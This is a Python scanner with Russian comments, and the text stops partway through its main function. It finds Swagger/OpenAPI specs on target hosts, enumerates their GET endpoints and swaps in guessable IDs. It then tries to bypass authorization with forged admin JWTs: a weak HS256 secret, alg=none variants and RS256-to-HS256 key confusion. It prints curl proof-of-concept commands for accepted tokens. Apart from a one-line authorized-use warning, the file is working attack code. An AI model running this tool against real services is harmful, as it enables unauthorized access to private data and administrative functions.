# python3 swagger_checker.py -i swagger_endpoints.txt -t 100 --jwt-test

import requests
import json
import urllib3
import re
import argparse
import threading
import base64
import hashlib
import hmac
import secrets
import time
import sys
from dataclasses import dataclass, field, asdict
from typing import Optional
from urllib.parse import urlparse
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

# Блокировка для thread-safe вывода
print_lock = threading.Lock()

def thread_safe_print(message):
    """Thread-safe print функция"""
    with print_lock:
        print(message)

def get_base_from_url(swagger_url):
    """Извлекает базовый URL из полного URL"""
    parsed = urlparse(swagger_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def extract_swagger_from_js(js_content):
    """Извлекает Swagger спецификацию из JavaScript кода"""
    try:
        # Ищем начало swaggerDoc
        start_marker = '"swaggerDoc":'
        start_idx = js_content.find(start_marker) + len(start_marker)
        
        if start_idx == len(start_marker) - 1:  # find вернул -1
            return None
        
        # Пропускаем пробелы
        while start_idx < len(js_content) and js_content[start_idx].isspace():
            start_idx += 1
        
        # Проверяем, что начинается объект
        if js_content[start_idx] != '{':
            return None
        
        # Парсим объект, учитывая вложенные скобки
        brace_count = 1
        end_idx = start_idx + 1
        
        while end_idx < len(js_content) and brace_count > 0:
            if js_content[end_idx] == '{':
                brace_count += 1
            elif js_content[end_idx] == '}':
                brace_count -= 1
            end_idx += 1
        
        if brace_count != 0:
            return None
        
        # Извлекаем строку JSON
        swagger_json_str = js_content[start_idx:end_idx].strip()
        
        # Парсим JSON
        swagger_data = json.loads(swagger_json_str)
        return swagger_data
            
    except (json.JSONDecodeError, Exception):
        pass
        
    return None

def generate_swagger_urls(swagger_ui_url):
    """Генерирует возможные пути к Swagger спецификации (JSON и JS)"""
    base_url = get_base_from_url(swagger_ui_url)
    parsed = urlparse(swagger_ui_url)
    path = parsed.path.lower()
    
    json_urls = []
    js_urls = []
    
    # Стандартные JSON пути
    json_urls.extend([
        f"{base_url}/swagger/v1/swagger.json",
        f"{base_url}/swagger.json", 
        f"{base_url}/v2/api-docs",
        f"{base_url}/api-docs",
        f"{base_url}/swagger/doc.json",
        f"{base_url}/api/swagger.json",
        f"{base_url}/openapi.json",
        f"{base_url}/swagger/developer/swagger.json"
    ])
    
    # Стандартные JS пути
    js_urls.extend([
        f"{base_url}/swagger/swagger-ui-init.js",
        f"{base_url}/api/swagger/swagger-ui-init.js", 
        f"{base_url}/swagger-ui-init.js"
    ])
    
    # Анализ конкретного пути для генерации специфичных вариантов
    if path.endswith("/swagger-ui.js"):
        json_urls.extend([
            f"{base_url}/swagger.json",
            f"{base_url}/v2/api-docs", 
            f"{base_url}/api/swagger.json"
        ])
        js_urls.extend([
            f"{base_url}/swagger-ui-init.js",
            f"{base_url}/swagger/swagger-ui-init.js"
        ])
    
    elif "/swagger/index.html" in path:
        swagger_base = path.replace("/index.html", "")
        json_urls.extend([
            f"{base_url}{swagger_base}/v1/swagger.json",
            f"{base_url}{swagger_base}/swagger.json",
            f"{base_url}{swagger_base}/doc.json"
        ])
        js_urls.append(f"{base_url}{swagger_base}/swagger-ui-init.js")
    
    elif path.endswith("/api/swagger"):
        api_base = path.replace("/swagger", "")
        json_urls.extend([
            f"{base_url}{api_base}/swagger.json",
            f"{base_url}{api_base}/swagger/swagger.json", 
            f"{base_url}{api_base}/v2/api-docs"
        ])
        js_urls.append(f"{base_url}/api/swagger/swagger-ui-init.js")
    
    elif "swagger" in path:
        if path.endswith(('.js', '.html', '.htm')):
            json_path = path.rsplit('.', 1)[0] + '.json'
            json_urls.append(f"{base_url}{json_path}")
        
        dir_path = '/'.join(path.split('/')[:-1])
        if dir_path:
            json_urls.append(f"{base_url}{dir_path}/swagger.json")
            js_urls.append(f"{base_url}{dir_path}/swagger-ui-init.js")
    
    # Убираем дубликаты, сохраняя порядок
    json_urls = list(dict.fromkeys(json_urls))
    js_urls = list(dict.fromkeys(js_urls))
    
    return json_urls, js_urls

def has_id_parameter(url):
    """Проверяет, содержит ли URL параметры ID"""
    id_pattern = r'\{[^}]*[iI][dD][^}]*\}'
    return re.search(id_pattern, url) is not None

def generate_id_variants(url):
    """Генерирует варианты URL с заменой ID параметров на числа"""
    id_pattern = r'\{[^}]*[iI][dD][^}]*\}'
    variants = []
    
    for id_value in [1, 2, 3, "me", "current", "admin"]:
        variant_url = re.sub(id_pattern, str(id_value), url)
        variants.append(variant_url)
    
    return variants

def is_json_response(response):
    """Проверяет, является ли ответ JSON"""
    content_type = response.headers.get('content-type', '').lower()
    return 'application/json' in content_type

def has_non_empty_body(response):
    """Проверяет, что JSON тело ответа не пустое"""
    try:
        if response.text.strip():
            json_data = response.json()
            if isinstance(json_data, dict):
                return len(json_data) > 0
            elif isinstance(json_data, list):
                return len(json_data) > 0
            else:
                return json_data is not None
        return False
    except:
        return False


# ===========================================================================
# JWT-тестирование (перенесено из auth_checker)
# ПРЕДУПРЕЖДЕНИЕ: используется только для авторизованных проверок собственных
# таргетов. Логика: если эндпоинт без токена не отдаёт данные, пробуем набор
# заведомо подделанных токенов (слабый HS256-секрет, alg=none в разных
# регистрах и с пустым payload, опционально RS256->HS256 key confusion), плюс
# негативный контроль (мусорная подпись) для отсева ложных срабатываний.
# ===========================================================================

ALLOWED_CONTENT_TYPES = ("application/json", "text/plain")
ALG_NONE_CASES = ("none", "None", "NONE")  # некоторые парсеры сравнивают alg регистрозависимо

# Тривиальные тела ответа вида health-check (OK/HEALTHY/PONG и т.п.) считаются
# false positive: сервер вернул generic health-check, а не реальные данные
DEFAULT_TRIVIAL_BODY_VALUES = {
    "ok", "healthy", "true", "success", "pong", "up", "alive", "yes", "1", "0",
    "null", "none", "ready", "running", "active", "pass", "passed", "green",
}
HEALTH_LIKE_JSON_KEYS = {"status", "health", "state", "result", "message"}


def is_trivial_response(content: bytes, extra_trivial_values: Optional[set] = None) -> bool:
    """Определяет, является ли тело ответа тривиальным health-check ответом
    (просто 'OK'/'HEALTHY' и т.п.), а не реальными данными - чтобы отсеять false positive."""
    trivial_values = DEFAULT_TRIVIAL_BODY_VALUES | (extra_trivial_values or set())

    try:
        text = content.decode("utf-8", errors="ignore").strip()
    except Exception:
        return False

    if not text:
        return False

    bare = text.strip("\"' \t\n").lower()
    if bare in trivial_values:
        return True

    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return False

    if isinstance(data, dict) and 1 <= len(data) <= 3:
        keys_lower = {k.lower() for k in data.keys()}
        if keys_lower & HEALTH_LIKE_JSON_KEYS:
            values_trivial = True
            for v in data.values():
                if isinstance(v, bool):
                    continue
                if isinstance(v, str) and v.strip("\"' \t\n").lower() in trivial_values:
                    continue
                values_trivial = False
                break
            if values_trivial:
                return True

    return False


def default_jwt_payload() -> dict:
    """Захардкоженный generic-admin payload. iat/nbf/exp считаются на момент
    вызова, чтобы токен не выглядел просроченным/подозрительно старым."""
    now = int(time.time())
    return {
        "sub": "admin", "user": "admin", "role": "admin", "admin": True,
        "iat": now, "nbf": now - 60, "exp": now + 60 * 60 * 24 * 365,
    }


def azure_b2c_jwt_payload() -> dict:
    """Payload в стиле Azure AD B2C токена (iss/aud/oid/tfp/emails и т.п.)."""
    now = int(time.time())
    return {
        "iss": "https://login.microsoftonline.com/00000000-0000-0000-0000-000000000000/v2.0/",
        "exp": now + 60 * 60 * 24 * 365,
        "nbf": now - 300,
        "iat": now,
        "aud": "00000000-0000-0000-0000-000000000000",
        "sub": "00000000-0000-0000-0000-000000000000",
        "oid": "00000000-0000-0000-0000-000000000000",
        "tid": "00000000-0000-0000-0000-000000000000",
        "tfp": "B2C_1_signupsignin",
        "given_name": "Test",
        "family_name": "Admin",
        "name": "Test Admin",
        "emails": ["admin@example.com"],
        "idp": "local",
        "roles": ["admin"],
        "extension_Role": "admin",
        "ver": "1.0",
    }


def parse_claim_overrides(claim_args) -> dict:
    """Парсит список 'KEY=VALUE' из --jwt-claim в словарь claims.
    Значение пытается распарситься как JSON, иначе остаётся строкой."""
    overrides = {}
    for item in claim_args:
        if "=" not in item:
            thread_safe_print(f"[!] Некорректный --jwt-claim (ожидается KEY=VALUE), пропущен: {item}")
            continue
        key, raw_value = item.split("=", 1)
        key = key.strip()
        raw_value = raw_value.strip()
        try:
            value = json.loads(raw_value)
        except json.JSONDecodeError:
            value = raw_value
        overrides[key] = value
    return overrides


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_jwt_hs256(secret: str, payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def make_jwt_none(payload: dict, alg_value: str = "none") -> str:
    header = {"alg": alg_value, "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def make_jwt_garbage(payload: dict) -> str:
    """Токен с правильной структурой (HS256), но заведомо неверной подписью.
    Негативный контроль: если сервер принимает и его - значит, подпись вообще
    не проверяется, и дело не в слабом секрете."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    garbage_sig = b64url_encode(secrets.token_bytes(32))
    return f"{header_b64}.{payload_b64}.{garbage_sig}"


def make_jwt_rs256_confusion(rsa_public_key_pem: bytes, payload: dict) -> str:
    """Атака RS256 -> HS256 key confusion: публичный RSA-ключ подставляется как
    HMAC-секрет. Если сервер не закрепляет ожидаемый алгоритм - подделка проходит."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(rsa_public_key_pem, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def load_rsa_public_key(source: str, timeout: int = 10) -> bytes:
    """Загружает публичный RSA-ключ (PEM) из локального файла или по URL."""
    if source.startswith(("http://", "https://")):
        resp = requests.get(source, timeout=timeout, verify=False)
        resp.raise_for_status()
        return resp.content
    with open(source, "rb") as f:
        return f.read()


def build_curl_poc(url: str, delivery: str, token: str, header_name: str, cookie_name: str) -> str:
    if delivery == "bearer":
        return f"curl -i -H '{header_name}: Bearer {token}' '{url}'"
    else:
        return f"curl -i -H 'Cookie: {cookie_name}={token}' '{url}'"


@dataclass
class JwtCheck:
    kind: str
    delivery: str  # "bearer" | "cookie"
    token: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_control: bool = False  # True = негативный контроль (garbage-подпись)
    is_trivial_body: bool = False  # True = health-check-подобное тело (false positive)


@dataclass
class JwtConfig:
    jwt_test: bool = False
    secret: str = "secret"
    payload: dict = field(default_factory=default_jwt_payload)
    header_name: str = "Authorization"
    cookie_name: str = "access_token"
    rsa_pubkey_pem: Optional[bytes] = None
    ignore_trivial_body: bool = True
    extra_trivial_values: Optional[set] = None
    timeout: int = 10


def jwt_response_accepted(response, ignore_trivial_body=True, extra_trivial_values=None) -> bool:
    """Критерий 'подделанный токен принят': тот же, что и для валидного GET-эндпоинта
    (200 + JSON + непустое тело), плюс отсев тривиальных health-check тел."""
    if response.status_code != 200:
        return False
    if not is_json_response(response):
        return False
    if not has_non_empty_body(response):
        return False
    if ignore_trivial_body and is_trivial_response(response.content, extra_trivial_values):
        return False
    return True


def run_jwt_checks(url, jwt_config: JwtConfig):
    """Прогоняет набор подделанных JWT по одному URL двумя способами доставки
    (Bearer-заголовок и cookie). Возвращает список JwtCheck."""
    checks = []

    tokens = {
        "hs256_default_secret": (make_jwt_hs256(jwt_config.secret, jwt_config.payload), False),
    }
    for alg_case in ALG_NONE_CASES:
        tokens[f"alg_{alg_case}"] = (make_jwt_none(jwt_config.payload, alg_case), False)
    tokens["alg_none_empty_payload"] = (make_jwt_none({}), False)
    if jwt_config.rsa_pubkey_pem:
        tokens["rs256_to_hs256_confusion"] = (
            make_jwt_rs256_confusion(jwt_config.rsa_pubkey_pem, jwt_config.payload), False)
    # негативный контроль
    tokens["garbage_signature"] = (make_jwt_garbage(jwt_config.payload), True)

    delivery_modes = [
        ("bearer", {"headers": {jwt_config.header_name: "Bearer {token}"}}),
        ("cookie", {"cookies": {jwt_config.cookie_name: "{token}"}}),
    ]

    for kind, (token, is_control) in tokens.items():
        for mode_name, mode_conf in delivery_modes:
            headers = dict(HEADERS)
            cookies = {}

            if "headers" in mode_conf:
                for h_name, h_val_tpl in mode_conf["headers"].items():
                    headers[h_name] = h_val_tpl.format(token=token)
            if "cookies" in mode_conf:
                for c_name, c_val_tpl in mode_conf["cookies"].items():
                    cookies[c_name] = c_val_tpl.format(token=token)

            try:
                resp = requests.get(url, headers=headers, cookies=cookies, verify=False,
                                    timeout=jwt_config.timeout, allow_redirects=False)
            except Exception as e:
                checks.append(JwtCheck(kind=kind, delivery=mode_name, token=token,
                                       error=str(e), is_control=is_control))
                continue

            content_type = resp.headers.get("content-type", "").split(";")[0].strip().lower()
            body_size = len(resp.content)
            trivial = jwt_config.ignore_trivial_body and is_trivial_response(
                resp.content, jwt_config.extra_trivial_values)
            accepted = jwt_response_accepted(resp, jwt_config.ignore_trivial_body,
                                             jwt_config.extra_trivial_values)

            checks.append(JwtCheck(
                kind=kind, delivery=mode_name, token=token, status_code=resp.status_code,
                content_type=content_type, body_size=body_size, accepted=accepted,
                is_control=is_control, is_trivial_body=trivial,
                curl_poc=build_curl_poc(url, mode_name, token, jwt_config.header_name, jwt_config.cookie_name),
            ))

    return checks


def classify_jwt_verdict(baseline_ok: bool, jwt_checks) -> str:
    """Итоговый вердикт по JWT с учётом негативного контроля.
    - no_auth_required       - эндпоинт и без токена отдаёт данные
    - signature_not_validated- принят даже мусорный токен (подпись не проверяется)
    - confirmed_vulnerable   - сервер проверяет JWT, но принял подделанный (секрет/none/confusion)
    - protected              - все подделанные токены отклонены"""
    if baseline_ok:
        return "no_auth_required"

    garbage_accepted = any(jc.accepted for jc in jwt_checks if jc.is_control)
    if garbage_accepted:
        return "signature_not_validated"

    forged_accepted = any(jc.accepted for jc in jwt_checks if not jc.is_control)
    if forged_accepted:
        return "confirmed_vulnerable"

    return "protected"


@dataclass
class EndpointResult:
    url: str
    is_valid: bool  # исходный критерий: GET 200 + JSON + непустое тело (без токена)
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    jwt_checks: list = field(default_factory=list)
    jwt_verdict: Optional[str] = None


def extract_paths_from_swagger(swagger_ui_url):
    """Извлекает API пути из Swagger спецификации"""
    paths = []
    base_url = get_base_from_url(swagger_ui_url)
    
    thread_safe_print(f"\n[INFO] Обрабатываем: {swagger_ui_url}")
    
    json_urls, js_urls = generate_swagger_urls(swagger_ui_url)
    all_urls = json_urls + js_urls
    
    spec_found = False
    for swagger_url in all_urls:
        try:
            thread_safe_print(f"[TRY] {swagger_url}")
            response = requests.get(swagger_url, headers=HEADERS, verify=False, timeout=10)
            
            if response.status_code == 200:
                data = None
                
                # Определяем тип файла и парсим соответственно
                if swagger_url in js_urls or swagger_url.endswith('.js'):
                    thread_safe_print(f"[JS] Парсим JavaScript файл")
                    data = extract_swagger_from_js(response.text)
                    if not data:
                        thread_safe_print(f"[SKIP] SwaggerDoc не найден в JS")
                        continue
                else:
                    content_type = response.headers.get('content-type', '').lower()
                    if 'application/json' in content_type or swagger_url.endswith('.json'):
                        try:
                            data = response.json()
                            thread_safe_print(f"[JSON] Парсим JSON файл")
                        except json.JSONDecodeError:
                            thread_safe_print(f"[SKIP] Невалидный JSON")
                            continue
                    else:
                        thread_safe_print(f"[SKIP] Неподдерживаемый тип (Content-Type: {content_type})")
                        continue
                
                # Валидация Swagger/OpenAPI спецификации
                if data and 'paths' in data and (data.get('swagger') or data.get('openapi')):
                    thread_safe_print(f"[SUCCESS] Найдена спецификация!")
                    thread_safe_print(f"[INFO] API версия: {data.get('swagger') or data.get('openapi')}")
                    thread_safe_print(f"[INFO] Найдено эндпоинтов: {len(data.get('paths', {}))}")
                    
                    # Извлекаем пути и методы
                    for endpoint in data.get("paths", {}):
                        methods = list(data["paths"][endpoint].keys())
                        # Фильтруем служебные ключи OpenAPI
                        http_methods = [m.upper() for m in methods if m.lower() in ['get', 'post', 'put', 'delete', 'patch', 'head', 'options']]
                        
                        if http_methods:
                            paths.append((base_url + endpoint, [m.lower() for m in http_methods]))
                            
                    spec_found = True
                    break
                else:
                    thread_safe_print(f"[SKIP] Не является Swagger спецификацией")
            else:
                if response.status_code not in [404, 403, 401]:
                    thread_safe_print(f"[{response.status_code}] {swagger_url}")
                    
        except Exception as e:
            if "404" not in str(e) and "403" not in str(e) and "timeout" not in str(e).lower():
                thread_safe_print(f"[ERR] {swagger_url} → {e}")
            continue
    
    if not spec_found:
        thread_safe_print(f"[WARNING] Swagger спецификация не найдена для {swagger_ui_url}!")
    
    return paths


def _print_jwt_checks(check_url, jwt_checks, verdict):
    """Построчный вывод результатов JWT-проверок одного URL (thread-safe)."""
    for jc in jwt_checks:
        label = f"{jc.kind}/{jc.delivery}"
        if jc.error:
            thread_safe_print(f"       └─ JWT[{label}] ошибка: {jc.error}")
        elif jc.accepted:
            tag = "[КОНТРОЛЬ принят]" if jc.is_control else "[!!! forged принят]"
            thread_safe_print(f"       └─ {tag} JWT[{label}]: status={jc.status_code} type={jc.content_type} size={jc.body_size}B")
            thread_safe_print(f"          PoC: {jc.curl_poc}")
        else:
            reason = " (health-check-подобное тело, false positive отфильтрован)" if jc.is_trivial_body else ""
            thread_safe_print(f"       └─ JWT[{label}] отклонён: status={jc.status_code} type={jc.content_type} size={jc.body_size}B{reason}")

    verdict_labels = {
        "confirmed_vulnerable": "[!!! ПОДТВЕРЖДЕНО] сервер валидирует JWT, но принимает подделанный (слабый секрет / alg=none / confusion)",
        "signature_not_validated": "[!] подпись JWT вообще не проверяется (принят даже случайный мусор)",
        "no_auth_required": "[i] эндпоинт отдаёт данные и без токена — авторизация не требуется вовсе",
        "protected": "[OK] все подделанные токены отклонены",
    }
    if verdict:
        thread_safe_print(f"       └─ ВЕРДИКТ: {verdict_labels.get(verdict, verdict)}")


def check_single_endpoint(url_methods_pair, jwt_config: Optional[JwtConfig] = None):
    """Проверяет один эндпоинт на доступность с JSON ответом.
    Если включён jwt_config.jwt_test - для недоступных без токена URL дополнительно
    прогоняет набор подделанных JWT. Возвращает список EndpointResult."""
    url, methods = url_methods_pair
    results = []

    if "get" not in methods:
        return results

    urls_to_check = [url]

    # Обработка ID параметров
    if has_id_parameter(url):
        id_variants = generate_id_variants(url)
        urls_to_check.extend(id_variants)
        thread_safe_print(f"\n[ID PARAM] Найден ID параметр в: {url}")
        thread_safe_print(f"[ID PARAM] Проверяем варианты: {id_variants}")

    for check_url in urls_to_check:
        try:
            response = requests.get(check_url, headers=HEADERS, verify=False, timeout=10)
        except Exception as e:
            if "timeout" not in str(e).lower():
                thread_safe_print(f"[ERR] {check_url} → {e}")
            continue

        content_type = response.headers.get('content-type', 'unknown')
        body_size = len(response.content)
        baseline_valid = (response.status_code == 200
                          and is_json_response(response)
                          and has_non_empty_body(response))

        # Исходный вывод (сохранён как был)
        if response.status_code == 200:
            if is_json_response(response):
                if has_non_empty_body(response):
                    thread_safe_print(f"[✓ SUCCESS] {check_url}")
                else:
                    thread_safe_print(f"[✗ EMPTY] {check_url} (JSON пустой)")
            else:
                thread_safe_print(f"[✗ NOT JSON] {check_url} (Content-Type: {content_type})")
        else:
            thread_safe_print(f"[{response.status_code}] {check_url}")

        er = EndpointResult(
            url=check_url, is_valid=baseline_valid, status_code=response.status_code,
            content_type=str(content_type), body_size=body_size,
        )

        # JWT-тестирование
        if jwt_config and jwt_config.jwt_test:
            if baseline_valid:
                # Эндпоинт и так доступен без токена - подделки запускать незачем
                er.jwt_verdict = "no_auth_required"
                _print_jwt_checks(check_url, [], er.jwt_verdict)
            else:
                thread_safe_print(f"\n[JWT] Проверяем обход авторизации: {check_url}")
                jwt_checks = run_jwt_checks(check_url, jwt_config)
                er.jwt_checks = jwt_checks
                er.jwt_verdict = classify_jwt_verdict(False, jwt_checks)
                _print_jwt_checks(check_url, jwt_checks, er.jwt_verdict)

        results.append(er)

    return results


def check_endpoints_threaded(endpoints, max_threads=5, jwt_config: Optional[JwtConfig] = None):
    """Проверяет эндпоинты на доступность с JSON ответом (многопоточно).
    Возвращает список EndpointResult."""
    all_results = []

    thread_safe_print(f"\n[INFO] Начинаем проверку {len(endpoints)} эндпоинтов в {max_threads} потоках...")

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_endpoint = {
            executor.submit(check_single_endpoint, endpoint, jwt_config): endpoint
            for endpoint in endpoints
        }

        for future in as_completed(future_to_endpoint):
            endpoint = future_to_endpoint[future]
            try:
                all_results.extend(future.result())
            except Exception as e:
                thread_safe_print(f"[ERR] Ошибка при обработке {endpoint}: {e}")

    valid_count = sum(1 for r in all_results if r.is_valid)
    thread_safe_print(f"\n[RESULT] Найдено {valid_count} валидных GET эндпоинтов с JSON ответом")
    return all_results


def check_endpoints_single(endpoints, jwt_config: Optional[JwtConfig] = None):
    """Проверяет эндпоинты на доступность с JSON ответом (однопоточно).
    Возвращает список EndpointResult."""
    all_results = []

    print(f"\n[INFO] Начинаем проверку {len(endpoints)} эндпоинтов (однопоточно)...")

    for endpoint in endpoints:
        all_results.extend(check_single_endpoint(endpoint, jwt_config))

    valid_count = sum(1 for r in all_results if r.is_valid)
    print(f"\n[RESULT] Найдено {valid_count} валидных GET эндпоинтов с JSON ответом")
    return all_results


def write_jwt_findings(output_path, results):
    """Пишет JWT-находки (confirmed_vulnerable / signature_not_validated / no_auth_required)
    в JSON-файл. Для каждой находки сохраняются только принятые (accepted) PoC."""
    findings = []
    for r in results:
        if r.jwt_verdict in ("confirmed_vulnerable", "signature_not_validated", "no_auth_required"):
            d = asdict(r)
            # оставляем только реально сработавшие попытки, чтобы не плодить отклонённые контроли
            d["jwt_checks"] = [c for c in d["jwt_checks"] if c.get("accepted")]
            findings.append(d)

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(findings, f, ensure_ascii=False, indent=2)

    return findings


def print_jwt_summary(results):
    """Печатает итоговую сводку по JWT-вердиктам со списком PoC."""
    confirmed = [r for r in results if r.jwt_verdict == "confirmed_vulnerable"]
    no_sig_check = [r for r in results if r.jwt_verdict == "signature_not_validated"]
    no_auth = [r for r in results if r.jwt_verdict == "no_auth_required"]
    protected = [r for r in results if r.jwt_verdict == "protected"]

    print(f"\n[*] JWT-вердикты: подтверждено уязвимых={len(confirmed)} | "
          f"подпись не проверяется={len(no_sig_check)} | без авторизации={len(no_auth)} | "
          f"защищено={len(protected)}")

    if confirmed:
        print(f"\n[!!!] ПОДТВЕРЖДЕНО: сервер валидирует JWT, но принимает подделанный ({len(confirmed)}):")
        for r in confirmed:
            for jc in r.jwt_checks:
                if jc.accepted and not jc.is_control:
                    print(f"      - {r.url}  [{jc.kind}/{jc.delivery}]")
                    print(f"        PoC: {jc.curl_poc}")

    if no_sig_check:
        print(f"\n[!] Подпись JWT вообще не проверяется (принят даже мусорный токен) ({len(no_sig_check)}):")
        for r in no_sig_check:
            print(f"      - {r.url}")
            for jc in r.jwt_checks:
                if jc.accepted and jc.is_control:
                    print(f"        PoC (мусорная подпись всё равно принята): {jc.curl_poc}")

    if no_auth:
        print(f"\n[i] Эндпоинты без авторизации вовсе (данные отдаются и без токена) ({len(no_auth)}):")
        for r in no_auth:
            print(f"      - {r.url}")
            print(f"        PoC (без токена вообще): curl -i '{r.url}'")


def load_swagger_urls(input_file, plain_mode=False):
    """Читает входной файл со Swagger UI URL.

    Форматы:
      - По умолчанию: строки инструмента вида "[swagger-api] <code> <method> <URL>"
        (URL берётся как 4-й элемент). Голые URL тоже подхватываются.
      - plain_mode=True: файл со списком URL, по одному на строку.
    Пустые строки и строки-комментарии (#) игнорируются в обоих режимах.
    """
    swagger_urls = []
    
    with open(input_file, "r") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            
            if plain_mode:
                # Режим голых ссылок: берём строку как URL
                if line.startswith("http://") or line.startswith("https://"):
                    swagger_urls.append(line)
                else:
                    thread_safe_print(f"[SKIP] Строка не похожа на URL: {line}")
            else:
                # Старый формат инструмента
                if line.startswith("[swagger-api]"):
                    parts = line.split()
                    if len(parts) >= 4:
                        swagger_urls.append(parts[3])
                    else:
                        thread_safe_print(f"[SKIP] Неполная строка [swagger-api]: {line}")
                # На всякий случай поддержим и голые URL даже в обычном режиме
                elif line.startswith("http://") or line.startswith("https://"):
                    swagger_urls.append(line)
    
    return swagger_urls

def main():
    """Основная функция"""
    parser = argparse.ArgumentParser(description='Swagger Endpoints Checker')
    parser.add_argument('-t', '--threads', type=int, default=1, 
                       help='Количество потоков для проверки эндпоинтов (по умолчанию: 1)')
    parser.add_argument('-i', '--input', default=None,
                       help='Входной файл (по умолчанию: swagger_endpoints.txt)')
    parser.add_argument('--urls', nargs='?', const=True, default=False, metavar='FILE',
                       help='Читать входной файл как список голых URL (по одному на строку), '
                            'а не как вывод инструмента формата "[swagger-api] ...". '
                            'Можно сразу указать файл: --urls swagger.txt')
    parser.add_argument('input_file', nargs='?', default=None,
                       help='Входной файл позиционным аргументом (альтернатива -i)')

    jwt_group = parser.add_argument_group("JWT-тестирование (только для авторизованных проверок собственных таргетов)")
    jwt_group.add_argument('--jwt-test', action='store_true',
                           help='Для эндпоинтов, недоступных без токена, пробовать обход через подделанные JWT: '
                                'слабый секрет (HS256), alg=none (в т.ч. регистровые варианты и пустой payload), '
                                'опц. RS256->HS256 confusion, плюс негативный контроль (мусорная подпись)')
    jwt_group.add_argument('--jwt-secret', default='secret',
                           help="Секрет для подписи HS256 токена (по умолчанию 'secret')")
    jwt_group.add_argument('--jwt-payload',
                           help='Путь к JSON файлу с claims для токена '
                                '(по умолчанию {"sub":"admin","role":"admin","admin":true})')
    jwt_group.add_argument('--jwt-azure-b2c', action='store_true',
                           help='Использовать payload в стиле Azure AD B2C (iss/aud/oid/tfp/emails). '
                                'Игнорируется, если задан --jwt-payload')
    jwt_group.add_argument('--jwt-header-name', default='Authorization',
                           help="Имя заголовка для Bearer-варианта (по умолчанию Authorization)")
    jwt_group.add_argument('--jwt-cookie-name', default='access_token',
                           help="Имя cookie для cookie-варианта (по умолчанию access_token)")
    jwt_group.add_argument('--jwt-rsa-pubkey',
                           help='Путь к файлу или URL публичного RSA-ключа (PEM) для атаки '
                                'RS256->HS256 key confusion')
    jwt_group.add_argument('--jwt-claim', action='append', default=[], metavar='KEY=VALUE',
                           help='Переопределить/добавить конкретный claim (можно несколько раз). '
                                'Значение парсится как JSON, иначе берётся как строка')
    jwt_group.add_argument('--jwt-output', default='swagger_jwt_findings.json',
                           help='Файл для сохранения JWT-находок (по умолчанию swagger_jwt_findings.json)')
    jwt_group.add_argument('--allow-trivial-bodies', action='store_true',
                           help='Не отсеивать тривиальные health-check ответы (OK/HEALTHY/PONG) как false positive')
    jwt_group.add_argument('--ignore-body-value', action='append', default=[], metavar='VALUE',
                           help='Дополнительное тривиальное значение тела для фильтрации (можно несколько раз)')

    args = parser.parse_args()

    # Режим "голые URL": включён, если передан флаг --urls (с файлом или без)
    plain_mode = args.urls is not False

    # Определяем входной файл по приоритету:
    #   1) --urls <FILE>         (имя файла сразу после флага)
    #   2) -i/--input <FILE>
    #   3) позиционный аргумент  (swagger_checker.py swagger.txt ...)
    #   4) значение по умолчанию
    url_file = args.urls if isinstance(args.urls, str) else None
    input_file = url_file or args.input or args.input_file or 'swagger_endpoints.txt'

    print("=== Swagger Endpoints Checker ===")
    print(f"[CONFIG] Потоков: {args.threads}")
    print(f"[CONFIG] Входной файл: {input_file}")
    print(f"[CONFIG] Режим: {'голые URL' if plain_mode else 'формат [swagger-api]'}")
    print(f"[CONFIG] JWT-тест: {'включён' if args.jwt_test else 'выключен'}")

    # Сборка конфигурации JWT
    jwt_config = None
    if args.jwt_test:
        jwt_payload = default_jwt_payload()
        if args.jwt_azure_b2c:
            jwt_payload = azure_b2c_jwt_payload()
        if args.jwt_payload:
            try:
                with open(args.jwt_payload, "r", encoding="utf-8") as f:
                    jwt_payload = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError) as e:
                print(f"[!] Не удалось прочитать --jwt-payload: {e}", file=sys.stderr)
                return

        if args.jwt_claim:
            overrides = parse_claim_overrides(args.jwt_claim)
            jwt_payload = {**jwt_payload, **overrides}
            print(f"[*] Claims переопределены через --jwt-claim: {list(overrides.keys())}")

        rsa_pubkey_pem = None
        if args.jwt_rsa_pubkey:
            try:
                rsa_pubkey_pem = load_rsa_public_key(args.jwt_rsa_pubkey)
                print(f"[*] Публичный RSA-ключ загружен ({len(rsa_pubkey_pem)} байт), "
                      f"включаю проверку RS256->HS256 confusion")
            except Exception as e:
                print(f"[!] Не удалось загрузить --jwt-rsa-pubkey: {e}", file=sys.stderr)
                return

        ignore_trivial_body = not args.allow_trivial_bodies
        extra_trivial_values = ({v.strip().lower() for v in args.ignore_body_value}
                                if args.ignore_body_value else None)
